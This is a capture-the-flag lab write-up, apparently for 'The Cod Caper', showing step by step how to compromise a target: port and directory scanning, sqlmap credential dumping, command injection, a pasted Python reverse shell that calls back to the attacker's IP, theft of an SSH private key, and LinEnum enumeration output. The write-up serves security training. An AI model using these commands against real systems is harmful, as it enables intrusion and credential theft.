# THE COD CAPER

Deply the machine.

---

## Host Enumeration:

**QUESTION #1**: How many ports are open on the target machine?

```
───╼ $sudo nmap -Pn -sV -sS 10.10.23.205
[sudo] password for hamza: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 22:23 PKT
Nmap scan report for 10.10.23.205
Host is up (0.54s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.67 seconds
```

**ANSWER**: *2*


**QUESTION #2**: What is the http-title of the web server?

```
───╼ $sudo nmap -Pn -sV -sS --script=http-title 10.10.23.205
[sudo] password for hamza: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 22:29 PKT
Nmap scan report for 10.10.23.205
Host is up (0.72s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.69 seconds
```

**ANSWER**: *Apache2 Ubuntu Default Page: It works*


**QUESTION #3**: What version is the ssh service?

**ANSWER**: *OpenSSH 7.2p2 Ubuntu 4ubuntu2.8*


**QUESTION #4**: What is the version of the web server?

**ANSWER**: *apache/2.4.18*

---

## Web Enumeration:

We need to bust the directory using dirbuter, for that we need a wordlist file and we are provided that. The file name is `big.txt`.

**QUESTION**: What is the name of the important file on the server?

Using the wordlist given list use brute-force attack to obtain the name of any important file or directory.

```
───╼ $gobuster dir -x php,txt,html,js --url http://10.10.204.54 --wordlist web-wordist/big.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.204.54
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                web-wordist/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,js,php,txt
[+] Timeout:                 10s
===============================================================
2021/12/23 21:12:45 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/administrator.php    (Status: 200) [Size: 409]
Progress: 18165 / 102390 (17.74%)             ^C
[!] Keyboard interrupt detected, terminating.
                                               
===============================================================
2021/12/23 21:26:45 Finished
===============================================================
```

**ANSWER**: *administrator.php*

## Web Eploitation:

After the directory brute forcing, the page we obtained contains a form, so now we can try exploiting SQL-Injection vulnerability and recover data tables

```
───╼ $sqlmap -a -u http://10.10.95.255/administrator.php --forms --dump-all
```

After running the aove mentioned command, we obtained some tables: *(file: ./SQLMAP Result/task4-sqlmap-result.txt)*

- information_schema
- mysql
- performance_schema
- sys
- users

Here 4 out of 5 tables are the default tables from MySQL Database, we will be focusing on the `users` table.

Now let's try extracting data of the `users` table.

```
───╼ $sqlmap -u http://10.10.61.77/administrator.php --forms -T users --dump

...
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+
...
```

**QUESTION**: What is the admin username?

**ANSWER**: *pingudad*

**QUESTION**: What is the admin password?

**ANSWER**: *secretpass*

**QUESTION**: How many forms of SQLI is the form vulnerable to?

**ANSWER**: *3*


## Command Execution:

Enter the credentials obtained. On the next page we have a input field where we can enter any command.

**QUESTION**: How many files are in the current directory?

```
───╼ $find . -type f

./2591c98b70119fe624898b1e424b5e91.php 
./administrator.php 
./index.html
```

**ANSWER**: *3*

**QUESTION**: Do I still have an account?

```
───╼ $ ls /home

papa pingu

---- OR ----

───╼ $ cat /etc/passwd
```

**ANSWER**: *Yes* (on the basis of user:pingu)

**QUESTION**: What is my ssh password?

Let's first try to initiate a netcat connection.
Start a listner on port 1234 on your system:

```
───╼ $ nc -lnvp 1234
```

Now paste this python reverse shell code in the form field:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.**.**",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Here in connect function, replace `10.9.**.**` with your IP.

After this, you will have a new terminal session on your terminal.

Now let's search for all the files owned by the user `pingu`

```
───╼ $ find / -group pingu
```

Only files that are owned by pingu are:

```
/home/pingu
/home/pingu/.bash_history
/home/pingu/.cache
/home/pingu/.cache/motd.legal-displayed
/home/pingu/.ssh
/home/pingu/.ssh/id_rsa
/home/pingu/.ssh/id_rsa.pub
/home/pingu/.nano
/home/pingu/.gdb_history
/home/pingu/.pwntools-cache-2.7
/home/pingu/.pwntools-cache-2.7/update
```

Here the only thing that is of interest is the .ssh directory and the keys in it, but we also need the pingu's password.

Now let's do some more searching, we'll look for files owned by our current user `www-data`.

```
───╼ $ find / -group www-data
```

We recieved a large list of files owned by our user, but amoung which the most prominent one was:

```
/var/hidden/pass
```

Let's see what's inside this file:

```
───╼ $ cat /var/hidden/pass
```

And we got our password:

```
pinguapingu
```
**ANSWER**: *pinguapingu*

Save the rsa private key in a `.key` file and now go to that directory and run this command:

```
───╼ $ ssh -i private.key pingu@<machine-ip> 
```

It will ask for the password, provide the above obtained password. After this, you're in.


## LinEnum:

For this part we need a linux enumeration script which can be downloaded from this [link](https://github.com/rebootuser/LinEnum.git)

To Download this run the following command:

```
───╼ $ git clone https://github.com/rebootuser/LinEnum.git
```

Next we need to copy the LinEnum.sh file to the hostd machine. For this one way is to transfer the file using `scp` command:

```
───╼ $ scp -i pingu.key /path/to/repo-directory/LinEnum/LinEnum.sh pingu@<hosted-machine-ip>:/tmp/
```

Now initate a `ssh` session and go the directory where you copied the file (/tmp/). The script can be run like any other bash script:

```
───╼ $ ./LinEnum.sh 
```

We got he following output:

```
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Sat Jan 29 08:55:14 PST 2022


### SYSTEM ##############################################
[-] Kernel information:
Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


[-] Hostname:
ubuntu


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1002(pingu) gid=1002(pingu) groups=1002(pingu),4(adm),24(cdrom),27(sudo),30(dip)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Thu Jan 16 21:09:47 -0800 2020
papa             tty1                      Thu Jan 16 20:15:17 -0800 2020
pingu            pts/0    10.4.27.78       Sat Jan 29 08:41:11 -0800 2022


[-] Who else is logged on:
 08:55:14 up 15 min,  1 user,  load average: 0.00, 0.04, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
pingu    pts/0    10.4.27.78       08:41    2.00s  0.33s  0.00s /bin/bash ./LinEnum.sh


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=1000(papa) gid=1000(papa) groups=1000(papa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=108(mysql) gid=116(mysql) groups=116(mysql)
uid=109(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1002(pingu) gid=1002(pingu) groups=1002(pingu),4(adm),24(cdrom),27(sudo),30(dip)


[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(papa) gid=1000(papa) groups=1000(papa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=1002(pingu) gid=1002(pingu) groups=1002(pingu),4(adm),24(cdrom),27(sudo),30(dip)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
papa:x:1000:1000:qaa:/home/papa:/bin/bash
mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
pingu:x:1002:1002::/home/pingu:/bin/bash


[-] Super user account(s):
root


[-] Accounts that have recently used sudo:
/home/papa/.sudo_as_admin_successful


[-] Are permissions on /home directories lax:
total 16K
drwxr-xr-x  4 root  root  4.0K Jan 15  2020 .
drwxr-xr-x 24 root  root  4.0K Jan 15  2020 ..
drwxr-xr-x  5 papa  papa  4.0K Jan 15  2020 papa
drwxrwxrwx  6 pingu pingu 4.0K Jan 20  2020 pingu


### ENVIRONMENTAL #######################################
[-] Environment information:
LC_PAPER=en_US.UTF-8
LC_ADDRESS=en_US.UTF-8
XDG_SESSION_ID=1
LC_MONETARY=en_US.UTF-8
SHELL=/bin/bash
TERM=xterm-256color
SSH_CLIENT=10.4.27.78 43544 22
LC_NUMERIC=en_US.UTF-8
SSH_TTY=/dev/pts/0
USER=pingu
LC_TELEPHONE=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
MAIL=/var/mail/pingu
LC_IDENTIFICATION=en_US.UTF-8
PWD=/tmp/aasajkfhdsakj
LANG=en_US.UTF-8
LC_MEASUREMENT=en_US.UTF-8
HOME=/home/pingu
SHLVL=2
LANGUAGE=en_US:
LOGNAME=pingu
SSH_CONNECTION=10.4.27.78 43544 10.10.64.2 22
XDG_RUNTIME_DIR=/run/user/1002
LC_TIME=en_US.UTF-8
LC_NAME=en_US.UTF-8
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
drwxr-xr-x 2 root root  4096 Jan 15  2020 /bin
drwxr-xr-x 2 root root  4096 Jan 15  2020 /sbin
drwxr-xr-x 2 root root 20480 Jan 16  2020 /usr/bin
drwxr-xr-x 2 root root  4096 Apr 12  2016 /usr/games
drwxr-xr-x 2 root root  4096 Jan 15  2020 /usr/local/bin
drwxr-xr-x 2 root root  4096 Feb 26  2019 /usr/local/games
drwxr-xr-x 2 root root  4096 Feb 26  2019 /usr/local/sbin
drwxr-xr-x 2 root root  4096 Jan 15  2020 /usr/sbin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
/usr/bin/tmux


[-] Current umask value:
0002
u=rwx,g=rwx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  670 Jun 22  2017 php
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  191 Jan 15  2020 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rwxr-xr-x  1 root root  539 Jun 11  2018 apache2
-rwxr-xr-x  1 root root 1474 Oct  9  2018 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  435 Nov 17  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Systemd timers:
NEXT                         LEFT     LAST                         PASSED    UNIT                         ACTIVATES
Sun 2022-01-30 01:29:56 PST  16h left Sat 2022-01-29 08:40:13 PST  15min ago apt-daily.timer              apt-daily.service
Sun 2022-01-30 06:19:01 PST  21h left Sat 2022-01-29 08:40:13 PST  15min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Sun 2022-01-30 08:54:53 PST  23h left Sat 2022-01-29 08:54:53 PST  26s ago   systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

3 timers listed.
Enable thorough tests to see inactive timers


### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 02:c6:ba:2b:c1:f3  
          inet addr:10.10.64.2  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::c6:baff:fe2b:c1f3/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:407 errors:0 dropped:0 overruns:0 frame:0
          TX packets:344 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:81202 (81.2 KB)  TX bytes:57869 (57.8 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:160 errors:0 dropped:0 overruns:0 frame:0
          TX packets:160 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:11840 (11.8 KB)  TX bytes:11840 (11.8 KB)


[-] ARP history:
ip-10-10-0-1.eu-west-1.compute.internal (10.10.0.1) at 02:c8:85:b5:5a:aa [ether] on eth0


[-] Nameserver(s):
nameserver 10.0.0.2


[-] Default route:
default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  1.7  1.1  37852  5876 ?        Ss   08:39   0:17 /sbin/init noprompt
root         2  0.0  0.0      0     0 ?        S    08:39   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    08:39   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   08:39   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    08:39   0:00 [kworker/u30:0]
root         7  0.0  0.0      0     0 ?        S    08:39   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    08:39   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    08:39   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    08:39   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    08:39   0:00 [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   08:39   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   08:39   0:00 [perf]
root        14  0.0  0.0      0     0 ?        S    08:39   0:00 [xenwatch]
root        15  0.0  0.0      0     0 ?        S    08:39   0:00 [xenbus]
root        17  0.0  0.0      0     0 ?        S    08:39   0:00 [khungtaskd]
root        18  0.0  0.0      0     0 ?        S<   08:39   0:00 [writeback]
root        19  0.0  0.0      0     0 ?        SN   08:39   0:00 [ksmd]
root        20  0.0  0.0      0     0 ?        S<   08:39   0:00 [crypto]
root        21  0.0  0.0      0     0 ?        S<   08:39   0:00 [kintegrityd]
root        22  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root        23  0.0  0.0      0     0 ?        S<   08:39   0:00 [kblockd]
root        24  0.0  0.0      0     0 ?        S<   08:39   0:00 [ata_sff]
root        25  0.0  0.0      0     0 ?        S<   08:39   0:00 [md]
root        26  0.0  0.0      0     0 ?        S<   08:39   0:00 [devfreq_wq]
root        29  0.0  0.0      0     0 ?        S    08:39   0:00 [kswapd0]
root        30  0.0  0.0      0     0 ?        S<   08:39   0:00 [vmstat]
root        31  0.0  0.0      0     0 ?        S    08:39   0:00 [fsnotify_mark]
root        32  0.0  0.0      0     0 ?        S    08:39   0:00 [ecryptfs-kthrea]
root        48  0.0  0.0      0     0 ?        S<   08:39   0:00 [kthrotld]
root        49  0.0  0.0      0     0 ?        S<   08:39   0:00 [acpi_thermal_pm]
root        50  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root        51  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root        52  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root        53  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root        54  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root        55  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root        56  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root        57  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root        58  0.0  0.0      0     0 ?        S    08:39   0:00 [scsi_eh_0]
root        59  0.0  0.0      0     0 ?        S<   08:39   0:00 [scsi_tmf_0]
root        60  0.0  0.0      0     0 ?        S    08:39   0:00 [scsi_eh_1]
root        61  0.0  0.0      0     0 ?        S<   08:39   0:00 [scsi_tmf_1]
root        63  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root        64  0.0  0.0      0     0 ?        S    08:39   0:00 [kworker/u30:3]
root        68  0.0  0.0      0     0 ?        S<   08:39   0:00 [ipv6_addrconf]
root        79  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root        82  0.0  0.0      0     0 ?        S<   08:39   0:00 [deferwq]
root        83  0.0  0.0      0     0 ?        S<   08:39   0:00 [charger_manager]
root       120  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root       121  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root       122  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root       123  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root       124  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root       125  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root       126  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root       127  0.0  0.0      0     0 ?        S<   08:39   0:00 [bioset]
root       128  0.0  0.0      0     0 ?        S<   08:39   0:00 [kpsmoused]
root       129  0.0  0.0      0     0 ?        S<   08:39   0:00 [ttm_swap]
root       153  0.0  0.0      0     0 ?        S<   08:39   0:00 [kworker/0:1H]
root       155  0.0  0.0      0     0 ?        S    08:39   0:00 [jbd2/xvda1-8]
root       156  0.0  0.0      0     0 ?        S<   08:39   0:00 [ext4-rsv-conver]
root       193  0.0  0.0      0     0 ?        S    08:39   0:00 [kworker/0:4]
root       202  0.0  0.5  27704  2628 ?        Ss   08:39   0:00 /lib/systemd/systemd-journald
root       210  0.0  0.0      0     0 ?        S    08:39   0:00 [kauditd]
root       265  0.3  0.9  45500  4948 ?        Ss   08:39   0:03 /lib/systemd/systemd-udevd
systemd+   305  0.0  0.5 100324  2532 ?        Ssl  08:39   0:00 /lib/systemd/systemd-timesyncd
root       519  0.0  0.1  16124   864 ?        Ss   08:40   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
message+   573  0.0  0.7  42900  3812 ?        Ss   08:40   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       579  0.0  0.5  29008  2916 ?        Ss   08:40   0:00 /usr/sbin/cron -f
syslog     580  0.0  0.6 256392  3188 ?        Ssl  08:40   0:00 /usr/sbin/rsyslogd -n
root       585  0.0  1.2 275868  6032 ?        Ssl  08:40   0:00 /usr/lib/accountsservice/accounts-daemon
root       586  0.0  0.6  28544  3104 ?        Ss   08:40   0:00 /lib/systemd/systemd-logind
root       652  0.0  0.3  15936  1736 tty1     Ss+  08:40   0:00 /sbin/agetty --noclear tty1 linux
root       653  0.0  0.4  15752  2324 ttyS0    Ss+  08:40   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
mysql      667  0.2 27.1 1114364 135360 ?      Ssl  08:40   0:01 /usr/sbin/mysqld
root       676  0.0  1.1  65512  5508 ?        Ss   08:40   0:00 /usr/sbin/sshd -D
root       706  0.0  4.6 258264 23052 ?        Ss   08:40   0:00 /usr/sbin/apache2 -k start
www-data   728  0.0  1.1 258288  5936 ?        S    08:40   0:00 /usr/sbin/apache2 -k start
www-data   729  0.0  1.1 258288  5936 ?        S    08:40   0:00 /usr/sbin/apache2 -k start
www-data   730  0.0  1.1 258288  5936 ?        S    08:40   0:00 /usr/sbin/apache2 -k start
www-data   731  0.0  1.1 258288  5936 ?        S    08:40   0:00 /usr/sbin/apache2 -k start
www-data   732  0.0  1.1 258288  5936 ?        S    08:40   0:00 /usr/sbin/apache2 -k start
root       836  0.0  1.3  92832  6920 ?        Ss   08:40   0:00 sshd: pingu [priv]
pingu      839  0.0  0.9  45280  4640 ?        Ss   08:41   0:00 /lib/systemd/systemd --user
pingu      841  0.0  0.3  61304  1968 ?        S    08:41   0:00 (sd-pam)
pingu      863  0.0  0.6  92832  3468 ?        S    08:41   0:00 sshd: pingu@pts/0
pingu      864  0.0  1.0  22496  5228 pts/0    Ss   08:41   0:00 -bash
root       905  0.0  0.0      0     0 ?        S    08:46   0:00 [kworker/0:1]
root       923  0.0  0.0      0     0 ?        S    08:54   0:00 [kworker/0:0]
pingu      928  0.0  0.8  13512  4036 pts/0    S+   08:55   0:00 /bin/bash ./LinEnum.sh
pingu      929  0.0  0.7  13536  3536 pts/0    S+   08:55   0:00 /bin/bash ./LinEnum.sh
pingu      930  0.0  0.1   7296   676 pts/0    S+   08:55   0:00 tee -a
pingu     1118  0.0  0.5  13536  2968 pts/0    S+   08:55   0:00 /bin/bash ./LinEnum.sh
pingu     1119  0.0  0.6  37364  3300 pts/0    R+   08:55   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
1016K -rwxr-xr-x 1 root root 1014K May 16  2017 /bin/bash
 1.6M -rwxr-xr-x 1 root root  1.6M Feb 13  2019 /lib/systemd/systemd
 320K -rwxr-xr-x 1 root root  319K Feb 13  2019 /lib/systemd/systemd-journald
 608K -rwxr-xr-x 1 root root  605K Feb 13  2019 /lib/systemd/systemd-logind
 140K -rwxr-xr-x 1 root root  139K Feb 13  2019 /lib/systemd/systemd-timesyncd
 444K -rwxr-xr-x 1 root root  443K Feb 13  2019 /lib/systemd/systemd-udevd
  44K -rwxr-xr-x 1 root root   44K May 16  2018 /sbin/agetty
 476K -rwxr-xr-x 1 root root  476K Mar  5  2018 /sbin/dhclient
    0 lrwxrwxrwx 1 root root    20 Jan 15  2020 /sbin/init -> /lib/systemd/systemd
 220K -rwxr-xr-x 1 root root  219K Jan 12  2017 /usr/bin/dbus-daemon
 164K -rwxr-xr-x 1 root root  162K Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
 648K -rwxr-xr-x 1 root root  648K Oct  8  2019 /usr/sbin/apache2
  44K -rwxr-xr-x 1 root root   44K Apr  5  2016 /usr/sbin/cron
  24M -rwxr-xr-x 1 root root   24M Nov 15  2019 /usr/sbin/mysqld
